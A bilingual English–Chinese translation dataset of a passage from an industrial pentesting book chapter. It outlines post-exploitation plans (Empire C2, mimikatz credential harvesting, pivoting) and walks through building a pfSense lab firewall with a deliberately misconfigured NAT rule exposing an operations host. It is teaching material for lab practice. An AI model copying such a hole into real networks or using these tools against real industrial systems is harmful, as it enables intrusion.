- en: '*Chapter 11*: Whoot… I Have To Go Deep'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第11章*：哇哦…我必须深入'
- en: After reading the previous chapter, we have a foothold/shell, but now what?
    Next, we need to understand where we have landed and what we have access to. This
    includes gathering as much information as possible, harvesting credentials, mapping
    network connections, using proxies to run internal network scans, and discovering
    pivotable hosts. This is the phase where we need to traverse the inside of the
    system. We can accomplish this by using tools to map the network through proxies
    and go deeper. Depending on the entry point, there will be key information to
    discover, including clues, which will provide details about lower-level systems
    that will be required to get down to the physical I/O.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 阅读完上一章后，我们已经有了一个立足点/外壳，但接下来怎么办呢？接下来，我们需要了解自己处于哪个位置，并且能访问什么内容。这包括尽可能多地收集信息，获取凭证，映射网络连接，使用代理进行内部网络扫描，以及发现可转移的主机。这个阶段是我们需要穿越系统内部的阶段。我们可以通过使用工具通过代理映射网络，深入挖掘。根据入口点的不同，会有关键信息需要发现，包括线索，这些线索将提供关于低层系统的细节，进而帮助我们接触到物理I/O。
- en: In this chapter, we will be installing a firewall that will allow us to build
    out segmentation in our lab network. After gaining initial access to a network,
    this tends to be where people get stuck and typically ask questions such as, what
    do I do now? How do I gain administrative access? Where do I go next? This chapter
    will help address these questions. We will leverage Empire to build a **Control
    and Command** (**C2**) server, which will allow us to harness credentials, find
    exploitable services, and gain elevated privileges. Next, we will work with port
    forwarding, SSH tunneling, and proxychains to get us further into the network
    and ultimately compromise the industrial process.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将安装一款防火墙，它将允许我们在实验室网络中构建分段。在初步获得网络访问权限后，这通常是人们卡住的地方，并且常常会问，接下来我该做什么？我如何获取管理员权限？接下来去哪儿？本章将帮助解答这些问题。我们将利用
    Empire 构建一个 **控制与命令**（**C2**）服务器，从而帮助我们收集凭证，查找可利用的服务，并获得提升的权限。接下来，我们将使用端口转发、SSH
    隧道和 proxychains 进一步深入网络，最终攻破工业过程。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将覆盖以下主要内容：
- en: Configuring a firewall
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 配置防火墙
- en: I have a shell, now what?
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我已经有一个 shell 了，接下来怎么办？
- en: Escalating privileges
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 提升权限
- en: Pivoting
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 转移
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'For this chapter, you will need the following:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 本章需要以下内容：
- en: A pfSense firewall, which you can download from [https://www.pfsense.org/download/](https://www.pfsense.org/download/).
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一台 pfSense 防火墙，你可以从 [https://www.pfsense.org/download/](https://www.pfsense.org/download/)
    下载。
- en: 'A Kali Linux VM running with the following tools installed:'
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一台运行 Kali Linux 的虚拟机，并已安装以下工具：
- en: '- **Empire**: [https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2](https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2)'
  id: totrans-12
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Empire**: [https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2](https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2)'
- en: '- **mimikatz**: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)'
  id: totrans-13
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **mimikatz**: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)'
- en: '- **Proxychains**: This can be installed by running **sudo apt install proxychains**'
  id: totrans-14
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Proxychains**: 通过运行 **sudo apt install proxychains** 安装'
- en: '- **chisel**: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)'
  id: totrans-15
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **chisel**: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)'
- en: '- **Freerdp2**: This can be installed by running **sudo apt install freerdp2-x11
    freerdp2-shadow-x11**'
  id: totrans-16
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Freerdp2**: 通过运行 **sudo apt install freerdp2-x11 freerdp2-shadow-x11**
    安装'
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3lAzYVb](https://bit.ly/3lAzYVb)'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在这里查看本章代码的实际操作：[https://bit.ly/3lAzYVb](https://bit.ly/3lAzYVb)
- en: Configuring a firewall
  id: totrans-18
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 配置防火墙
- en: You are probably wondering why, in every chapter, we are installing or configuring
    something new in the lab. You might be wondering, *why didn't we install this
    earlier in this book?* This isn't a wrong train of thought as we could have simply
    spent the first part of this book installing everything that we needed for the
    lab. However, I feel that it is very important to get into the practice of continually
    building and tearing down your lab. This helps promote adaptability, which is
    a key component of pentesting. Adding elements in every chapter helps reinforce
    the practice of adaptability.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 您可能会想，为什么在每一章中，我们都会安装或配置一些新的东西。你可能会想，*为什么我们没有在本书的早些时候安装这些？* 这种思路并没有错，因为我们本可以在本书的前半部分安装所有需要的实验室工具。然而，我认为让自己不断地构建和拆解实验室是非常重要的。这有助于培养适应能力，而适应能力是渗透测试的关键要素。每一章都添加新的元素，能够帮助强化适应能力的实践。
- en: 'Many vendors provide industrial firewalls, with some of the more industry-recognized
    names being Cisco, Fortinet, Checkpoint, Palo Alto, Belden, and Moxa. Each vendor
    comes with a list of pros and cons, techniques, and features, which I will leave
    up to you to investigate further. When it comes to implementing firewalls and
    encountering them during an engagement, you have to be highly adaptive. I have
    seen networks with zero firewalls installed and then on the flip side, I have
    seen networks with micro-segmentation and multi-tiered separation of duties, which
    means that many hands are required to try and build a connection across a corporate
    network. By introducing a firewall to our lab, we will be implementing controlled
    segmentation for our network. In this section, we will be installing and configuring
    the latest version of the pfSense (Community Edition) firewall. Let''s get started:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 很多厂商提供工业级防火墙，其中一些更具行业认可的品牌有思科（Cisco）、堡垒（Fortinet）、检查点（Checkpoint）、帕洛阿尔托（Palo
    Alto）、贝尔登（Belden）和莫萨（Moxa）。每个厂商都有其优缺点、技术特点和功能，您可以进一步研究了解。在实施防火墙并在参与过程中遇到它们时，您必须具备高度的适应能力。我曾见过没有安装任何防火墙的网络，也见过那些使用微分段和多层职责分离的网络，这意味着需要许多人合作才能在企业网络中建立连接。通过在我们的实验室中引入防火墙，我们将实现对网络的受控分段。在本节中，我们将安装并配置最新版本的
    pfSense（社区版）防火墙。让我们开始吧：
- en: 'Navigate to the following link to download the latest version of pfSense. At
    the time of writing, this is version 2.5.1: [https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz](https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz).'
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 请访问以下链接下载 pfSense 的最新版本。撰写本文时，这是 2.5.1 版本：[https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz](https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz)。
- en: 'Once you have the ISO, make sure that you load it into your datastore and start
    up a new VM. I used the options shown in the following screenshot for the configuration.
    The most important aspect is the network adapters. We will be placing the firewall
    at Level 4 so that it connects **Level 5: Enterprise** to **Level 3: Operations**,
    as shown in the following screenshot:'
  id: totrans-22
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 一旦您获得了 ISO 文件，确保将其加载到数据存储中并启动一个新的虚拟机。我在以下截图中展示了配置时所选择的选项。最重要的部分是网络适配器。我们将在第
    4 层放置防火墙，以便它将 **第 5 层：企业层** 连接到 **第 3 层：运营层**，如下图所示：
- en: '![Figure 11.1 – Firewall configuration'
  id: totrans-23
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.1 – 防火墙配置'
- en: '](image/B16321_11_001.jpg)'
  id: totrans-24
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_001.jpg)'
- en: Figure 11.1 – Firewall configuration
  id: totrans-25
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.1 – 防火墙配置
- en: Once configured, start up the VM and wait while it performs the initial boot.
    You will be greeted by the **End User License Agreement** (**EULA**). Go ahead
    and click **<Accept>**, as shown in the following screenshot:![Figure 11.2 – EULA
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置完成后，启动虚拟机并等待初始启动。您将看到 **终端用户许可协议** (**EULA**) 页面。点击 **<接受>**，如以下截图所示：![图 11.2
    – EULA
- en: '](image/B16321_11_002.jpg)'
  id: totrans-27
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_002.jpg)'
- en: Figure 11.2 – EULA
  id: totrans-28
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.2 – 终端用户许可协议（EULA）
- en: After accepting the agreement, you will be presented with three options. Select
    **Install** and start installing pfSense, as shown in the following screenshot:![Figure
    11.3 – Install pfSense option
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在接受协议后，您将看到三个选项。选择 **安装** 并开始安装 pfSense，如下图所示：![图 11.3 – 安装 pfSense 选项
- en: '](image/B16321_11_003.jpg)'
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_003.jpg)'
- en: Figure 11.3 – Install pfSense option
  id: totrans-31
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.3 – 安装 pfSense 选项
- en: Next, you have the option to change the keymap language, depending on your location.
    Pick any language you wish. I will be using the standard **"US"** default option,
    as shown here:![Figure 11.4 – Keymap
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，您可以选择根据您的位置更改键盘映射语言。选择任何您想要的语言。我将使用标准的**"US"** 默认选项，如下所示：![图 11.4 – 键盘映射
- en: '](image/B16321_11_004.jpg)'
  id: totrans-33
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_004.jpg)'
- en: Figure 11.4 – Keymap
  id: totrans-34
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.4 – 键盘映射
- en: After keymapping, we can choose how we would like to partition the disk. I am
    going to use the **Auto (UFS) BIOS** method, as shown in the following screenshot:![Figure
    11.5 – Disk partitioning
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 键盘映射完成后，我们可以选择如何分区磁盘。我将使用 **自动 (UFS) BIOS** 方法，如下所示：![图 11.5 – 磁盘分区
- en: '](image/B16321_11_005.jpg)'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_005.jpg)'
- en: Figure 11.5 – Disk partitioning
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.5 – 磁盘分区
- en: Once the installer finishes running, you have the option to enter the terminal
    and add some tweaks to the firewall before rebooting. I selected **No** to keep
    everything at its defaults:![Figure 11.6 – Final tweaks
  id: totrans-38
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 安装程序运行完毕后，您可以选择进入终端并在重启之前对防火墙进行一些调整。我选择了 **否**，保持所有默认设置：![图 11.6 – 最终调整
- en: '](image/B16321_11_006.jpg)'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_006.jpg)'
- en: Figure 11.6 – Final tweaks
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.6 – 最终调整
- en: Now, you can reboot your system or enter the shell directly. I chose to reboot
    the system as a habit so that lingering changes aren't fully committed until a
    reboot occurs. Select **Reboot** to continue, as shown in the following screenshot:![Figure
    11.7 – Reboot
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，您可以重新启动系统或直接进入 shell。我选择重新启动系统作为习惯，以确保所有更改在重启之前不会完全生效。选择 **重启** 继续，如下所示：![图
    11.7 – 重启
- en: '](image/B16321_11_007.jpg)'
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_007.jpg)'
- en: Figure 11.7 – Reboot
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.7 – 重启
- en: Once the reboot completes, you will be presented with a list of options on the
    console. You should also see a DHCP **wan** that's been provided by your LABCORP
    DNS server, as well as a default **lan** address, as shown in the following screenshot:![Figure
    11.8 – Console menu
  id: totrans-44
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 重启完成后，您将在控制台上看到一系列选项。您还应该看到一个由您的 LABCORP DNS 服务器提供的 DHCP **wan**，以及一个默认的 **lan**
    地址，如下所示：![图 11.8 – 控制台菜单
- en: '](image/B16321_11_008.jpg)'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_008.jpg)'
- en: Figure 11.8 – Console menu
  id: totrans-46
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.8 – 控制台菜单
- en: We are going to use the default **lan** IP address and open a browser to configure
    the firewall via the web UI. Navigate to the IP address that's been assigned to
    your LAN. In my case, it is **192.168.3.1**. Use **admin** as your username and
    **pfsense** as your password to log into the firewall:![Figure 11.9 – pfSense
    login
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将使用默认的**lan** IP 地址，并打开浏览器通过 web UI 配置防火墙。导航到分配给 LAN 的 IP 地址。在我的例子中，它是 **192.168.3.1**。使用
    **admin** 作为用户名，**pfsense** 作为密码登录防火墙：![图 11.9 – pfSense 登录
- en: '](image/B16321_11_009.jpg)'
  id: totrans-48
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_009.jpg)'
- en: Figure 11.9 – pfSense login
  id: totrans-49
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.9 – pfSense 登录
- en: 'Once logged in, you will see the **pfSense Setup** wizard, as shown in the
    following screenshot:'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 登录后，您将看到 **pfSense 设置** 向导，如下所示：
- en: '![Figure 11.10 – Setup wizard'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.10 – 设置向导'
- en: '](image/B16321_11_010.jpg)'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_010.jpg)'
- en: Figure 11.10 – Setup wizard
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.10 – 设置向导
- en: Next, we must set up the **General Information** options for **Hostname**, **Domain**,
    and **Primary DNS Server**:![Figure 11.11 – General Information
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们必须为 **主机名**、**域** 和 **主 DNS 服务器** 设置**常规信息**选项：![图 11.11 – 常规信息
- en: '](image/B16321_11_011.jpg)'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_011.jpg)'
- en: Figure 11.11 – General Information
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.11 – 常规信息
- en: The next important option to configure will be the WAN interface. Set this to
    **DHCP**, as shown in the following screenshot:![Figure 11.12 – Configure WAN
    Interface
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来需要配置的重要选项是 WAN 接口。将其设置为 **DHCP**，如下所示：![图 11.12 – 配置 WAN 接口
- en: '](image/B16321_11_012.jpg)'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_012.jpg)'
- en: Figure 11.12 – Configure WAN Interface
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.12 – 配置 WAN 接口
- en: We also want to make sure that we don't block any RF1918 networks as we are
    going to be using this firewall internally, as shown here:![Figure 11.13 – RFC1918
    Networks
  id: totrans-60
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还要确保不会阻止任何 RFC1918 网络，因为我们将把这个防火墙用于内部网络，如下所示：![图 11.13 – RFC1918 网络
- en: '](image/B16321_11_013.jpg)'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_013.jpg)'
- en: Figure 11.13 – RFC1918 Networks
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.13 – RFC1918 网络
- en: Next, we want to set the LAN interface. For the subnet that we statically configured
    earlier in this book, we will be setting the address as **192.168.3.1**, as shown
    in the following screenshot:![Figure 11.14 – LAN interface
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们要设置 LAN 接口。对于我们之前在本书中静态配置的子网，我们将地址设置为 **192.168.3.1**，如下所示：![图 11.14 –
    LAN 接口
- en: '](image/B16321_11_014.jpg)'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_014.jpg)'
- en: Figure 11.14 – LAN interface
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.14 – LAN 接口
- en: You will have the option to change the default password for the admin interface,
    so go ahead and change it. Next, you will be asked to reload the configuration,
    which will take a minute or so. Once it has reloaded you will have to point your
    browser to **192.168.3.1** to get back to the web interface. Once you log back
    in to the web interface, you will see the dashboard, where you will see **System
    Information**, the **Interfaces** configuration, and **Netgate Services and Support**,
    as shown in the following screenshot:![Figure 11.15 – pfSense dashboard
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 您将有机会更改管理员界面的默认密码，请更改它。接下来，您将被要求重新加载配置，这将需要大约一分钟的时间。重新加载后，您需要将浏览器指向**192.168.3.1**以返回到
    Web 界面。重新登录 Web 界面后，您将看到仪表盘，在这里您将看到**系统信息**、**接口**配置和**Netgate 服务与支持**，如下图所示：![图
    11.15 – pfSense 仪表盘
- en: '](image/B16321_11_015.jpg)'
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_015.jpg)'
- en: Figure 11.15 – pfSense dashboard
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.15 – pfSense 仪表盘
- en: We want to set up a DHCP server for our LAN interface. Navigate to **Services**
    | **DHCP Server**, as shown in the following screenshot:![Figure 11.16 – DHCP
    server
  id: totrans-69
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们希望为我们的 LAN 接口设置一个 DHCP 服务器。请导航到**服务** | **DHCP 服务器**，如以下屏幕截图所示：![图 11.16 –
    DHCP 服务器
- en: '](image/B16321_11_016.jpg)'
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_016.jpg)'
- en: Figure 11.16 – DHCP server
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.16 – DHCP 服务器
- en: 'From here, we are going to set the **General Options** options by setting the
    following:'
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从这里开始，我们将通过设置以下内容来配置**常规选项**：
- en: '– **Subnet**: **192.168.3.0**'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **子网**：**192.168.3.0**
- en: '– **Subnet mask**: **255.255.255.0**'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **子网掩码**：**255.255.255.0**
- en: '– **Available range**: **192.168.3.1 – 192.168.3.254**'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **可用范围**：**192.168.3.1 – 192.168.3.254**
- en: '– **Range**: **From** **[192.168.3.100]** – **To** **[192.168.3.199]**'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **范围**：**从** **[192.168.3.100]** – **到** **[192.168.3.199]**
- en: 'Here is an example for you to follow:'
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这是一个供您参考的示例：
- en: '![Figure 11.17 – DHCP server'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.17 – DHCP 服务器'
- en: '](image/B16321_11_017.jpg)'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_017.jpg)'
- en: Figure 11.17 – DHCP server
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.17 – DHCP 服务器
- en: From here, we are going to add a *misconfigured* NAT rule to allow traffic from
    the enterprise to communicate with operations and vice versa:![Figure 11.18 –
    NAT selection
  id: totrans-81
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从这里开始，我们将添加一个*配置错误*的 NAT 规则，以允许来自企业的流量与操作系统通信，反之亦然：![图 11.18 – NAT 选择
- en: '](image/B16321_11_018.jpg)'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_018.jpg)'
- en: Figure 11.18 – NAT selection
  id: totrans-83
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.18 – NAT 选择
- en: Now, we want to select **Port Forward** and add a new rule. You should see an
    empty list:![Figure 11.19 – Port Forward
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们希望选择**端口转发**并添加一条新规则。您应该看到一个空列表：![图 11.19 – 端口转发
- en: '](image/B16321_11_019.jpg)'
  id: totrans-85
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_019.jpg)'
- en: Figure 11.19 – Port Forward
  id: totrans-86
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.19 – 端口转发
- en: Upon clicking the **Add** green button, you will be brought to the **Edit Redirect
    Entry** screen. We are going to leave most of the options as-is, but we must make
    some changes to the source and destination options.
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击绿色的**添加**按钮后，您将进入**编辑重定向条目**界面。我们将保持大部分选项不变，但必须对源和目标选项进行一些更改。
- en: 'The following are the options that we will want to configure:'
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下是我们需要配置的选项：
- en: '– **Source**: **Type** (**Network**) | **Address** (**172.16.0.0**) | **Mask**
    (**24**)'
  id: totrans-89
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **源**：**类型**（**网络**）| **地址**（**172.16.0.0**）| **掩码**（**24**）
- en: '– **Destination**: **Type** (**WAN address**)'
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **目标**：**类型**（**WAN 地址**）
- en: '– **Destination port range**: **From port** (**Any**) | **To port** (**Any**)'
  id: totrans-91
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **目标端口范围**：**从端口**（**任意**）| **到端口**（**任意**）
- en: '– **Redirect target IP**: **Type** (**Single host**) | **Address** (**192.168.3.10**)'
  id: totrans-92
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: – **重定向目标 IP**：**类型**（**单一主机**）| **地址**（**192.168.3.10**）
- en: 'See the following screenshot for some guidance:'
  id: totrans-93
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 请参考以下屏幕截图获取一些指导：
- en: '![Figure 11.20 – Port forward/edit'
  id: totrans-94
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.20 – 端口转发/编辑'
- en: '](image/B16321_11_020.jpg)'
  id: totrans-95
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_020.jpg)'
- en: Figure 11.20 – Port forward/edit
  id: totrans-96
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.20 – 端口转发/编辑
- en: Once configured and after providing a **Description**, make sure to click the
    **Save** button at the bottom of the screen. Once saved, you will see a popup
    that allows you to **Apply Changes** to the firewall. Go ahead and apply your
    changes, as shown here:![Figure 11.21 – The Apply Changes button
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置完成并提供**描述**后，请确保点击屏幕底部的**保存**按钮。保存后，您将看到一个弹出窗口，允许您**应用更改**到防火墙。请继续应用您的更改，如下所示：![图
    11.21 – 应用更改按钮
- en: '](image/B16321_11_021.jpg)'
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_021.jpg)'
- en: Figure 11.21 – The Apply Changes button
  id: totrans-99
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.21 – 应用更改按钮
- en: 'Now, you should see the following **Port Forward** rule:'
  id: totrans-100
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在，您应该能看到以下**端口转发**规则：
- en: '![Figure 11.22 – The Port Forward rule'
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.22 – 端口转发规则'
- en: '](image/B16321_11_022.jpg)'
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_022.jpg)'
- en: Figure 11.22 – The Port Forward rule
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.22 – 端口转发规则
- en: We want to validate that **Outbound NAT Mode** has been set to **Automatic outbound
    NAT rule generation**, as shown here:![Figure 11.23 – Outbound NAT Mode
  id: totrans-104
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们要验证是否已将 **出站 NAT 模式** 设置为 **自动出站 NAT 规则生成**，如图所示：![图 11.23 – 出站 NAT 模式
- en: '](image/B16321_11_023.jpg)'
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_023.jpg)'
- en: Figure 11.23 – Outbound NAT Mode
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.23 – 出站 NAT 模式
- en: Finally, we want to verify that our WAN rules were created by going to **Firewall**
    | **WAN**. You should have a rule that looks like this:![Figure 11.24 – WAN rule
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，我们要通过进入 **防火墙** | **WAN** 来验证我们的 WAN 规则是否已创建。你应该会看到类似这样的规则：![图 11.24 – WAN
    规则
- en: '](image/B16321_11_024.jpg)'
  id: totrans-108
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_024.jpg)'
- en: Figure 11.24 – WAN rule
  id: totrans-109
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.24 – WAN 规则
- en: 'Now that our firewall has been configured, we want to quickly add the Windows
    7 machine that we used earlier in this book to configure the PLC to the **labcorp.local**
    domain. Let''s get started:'
  id: totrans-110
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们的防火墙已配置完毕，我们需要将本书前面使用的 Windows 7 机器快速添加到 **labcorp.local** 域中，用于配置 PLC。让我们开始吧：
- en: To do this, we must edit our network interface and update the **Preferred DNS
    server** option, as shown here:![Figure 11.25 – Preferred DNS server
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为此，我们必须编辑我们的网络接口，并更新 **首选 DNS 服务器** 选项，如图所示：![图 11.25 – 首选 DNS 服务器
- en: '](image/B16321_11_025.jpg)'
  id: totrans-112
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_025.jpg)'
- en: Figure 11.25 – Preferred DNS server
  id: totrans-113
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.25 – 首选 DNS 服务器
- en: Next, navigate to **Computer** | **Properties** | **System Properties** | **Computer
    name**. From here, set **Computer name** to **OS1** for operator station 1\. Then,
    select **Domain** and set it to **labcorp.local**, as shown in the following screenshot:![Figure
    11.26 – Computer Name/Domain Changes
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，导航至 **计算机** | **属性** | **系统属性** | **计算机名称**。在这里，将 **计算机名称** 设置为 **OS1**，表示操作员工作站
    1。然后，选择 **域** 并将其设置为 **labcorp.local**，如以下截图所示：![图 11.26 – 计算机名称/域更改
- en: '](image/B16321_11_026.jpg)'
  id: totrans-115
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_026.jpg)'
